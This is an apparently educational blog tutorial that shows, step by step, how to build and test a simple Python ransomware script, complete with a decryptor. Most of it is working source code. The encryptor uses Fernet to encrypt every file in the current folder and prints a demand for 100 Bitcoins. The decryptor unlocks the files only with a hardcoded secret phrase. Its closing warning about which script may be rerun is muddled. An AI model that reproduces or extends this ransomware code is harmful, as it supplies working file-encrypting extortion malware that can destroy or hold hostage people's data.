# Create ransomware script in python & test

Today, we're going to create our own ransomware.
Aha, sounds interesting? It's not so complicated to build a simple one. We just need a system to test on where python is installed.

> DISCLAIMER: This whole article is purely for educational purpose only. My sole aim here is to teach how to create your own ransomware script in python3.

---

## What is a ransomware??

Ransomware is a malware designed to deny a user or organization access to files on their computer. By encrypting these files and demanding a ransom payment for the decryption key, cyberattackers place organizations in a position where paying the ransom is the easiest and cheapest way to regain access to their files.

The malware first gains access to the device. Depending on the type of ransomware, either the entire operating system or individual files are encrypted. A ransom is then demanded from the victim.

---

## Requirements:

1. A linux-based OS or [Windows Subsystem for Linux](https://dev.to/nitinkumar30/use-search-files-created-using-ubuntu-on-windows-1jid)
2. Internet connection

---

## Our approach !!

1. First, we'll need encrypt method which can encrypt the files
2. Then, we need to decrypt mthod which can decrypt the encrypted files if ransom is provided
3. We also need to keep key, which was used to encrypt the files & folders, so that decrypt the files, once ransom is fulfilled

---

## Let's begin !!

Let's break this into small chunks:

1. Create necessary files & folders
2. Write down our script for Encrypting the files
3. Write down our script for Decrypting the files
4. Giving the finishing touch to the project

---

## 1. Create necessary files & folders

Step 1: As everything is configured for you, open the Ubuntu on Windows. If not yet, checkout my recent post on it [here](https://dev.to/nitinkumar30/use-search-files-created-using-ubuntu-on-windows-1jid)
Step 2: Create a new folder using `mkdir ransomware` to create a directory named **ransomware**  
Step 3: Navigate to that directory using `cd ransomware`
Step 4: Create some random files with below commands:
        

```
        echo "This is a file" > file.txt
```

```
        echo "This is another file" > file2.txt
```
  

```
        echo "This is yet another 3rd file" > file3.txt
```
  

```
        echo "What is your name btw" > name.txt
```

Step 5: Now, create a directory with following command - `mkdir test`  
Step 6: You can check the contents of the files just created by running **cat** command - `cat file.txt` or `cat name.txt`  

---

## 2. Write down our script for Encrypting the files

Step 1: Now, we need to create our encrypting file to encrypt the required files, type the command - `nano voldemort.py`. This will create a python file with name voldemort & will open in vim editor.
Step 2: Following is the python code for encryption part.


```
#!/usr/bin/env python3

# importing necessary libraries
import os
from cryptography.fernet import Fernet

# Let's find some files

files = []

# checking all the files in current directory
for file in os.listdir():
        # ignoring the encrypting, decrypting & the key file
	if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
# print all the files which is going to be infected with encryption
print(files)

# Generate the key used to encrypt the files
key = Fernet.generate_key()

# print(key)

# write the key into the file thekey.key
with open("thekey.key", "wb") as thekey:
	thekey.write(key)

# This is the main method which is encrypting all the files with the given key
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

# The message which will be shown to the users
print("All your files has been encrypted !!\nSend me 100 Bitcoins or I'll delete them in 24 hours.")
```

---

## 3. Write down our script for Decrypting the files

Step 1: Now, we need to create our decrypting file. Type in the command - `nano decrypt.py`  
Step 2: Following is the python code for decryption part.

```
#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Let's find some files

files = []

for file in os.listdir():
	if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)


# key = Fernet.generate_key()

# print(key)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "coffee"

user_phrase = input("Enter the secret phrase to decrypt your files\n")
if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)

	print("Congrats, your files has been decrypted & safe now. Enjoy your coffee")
else:
	print("Sorry, wrong secret phrase. Send me more Bitcoins !!")

```

> Here, you'll observe that the encryption & decryption script are almost similar. Yes, they're. Actually, I've just copied the exact encryption file to create the decryption file & then done some minor changes to it.

---

## 4. Giving the finishing touch to the project

Now is the time to test our ransomware is working or not.

Here, we'll check by first checking the files are having decrypted data or not.
Then, we'll run the encrypt file & check the files are encrypted or not
Then, we'll run the decrypt file & check the files are decrypted with original data or not.

Step 1: Run the command - `cat file.txt` & then for remaining files
Step 2: Run the encrypting file - `python3 voldemort.py`
Step 3: Rerun step 1. You should see some random string is there in the contents of files
Step 4: Now, run the decrypting file - `python3 decrypt.py`. Give secretphrase as **coffee** to pass the security check. You can change it in decrypt file.
Step 5: Rerun step 1. You should see now, all the files will have original data of files. 

---

Note - Never run the encrypt file twice, else, you'll not be able to recover your files again. You can run encrypt file n number of times, but not the decrypt file.

- This complete tutorial can be found in [NetworkChuck video](https://youtu.be/UtMMjXOlRQc?si=UeHz6Wyy4IohhAPt)

---

Feel free to reach out to me via [LinkedIn](https://www.linkedin.com/in/nitin30kumar/), [Instagram](https://www.instagram.com/nitinkumar30.py/) or checkout my [Portfolio](https://nitinkr.me).

HAPPY HACKING !!!
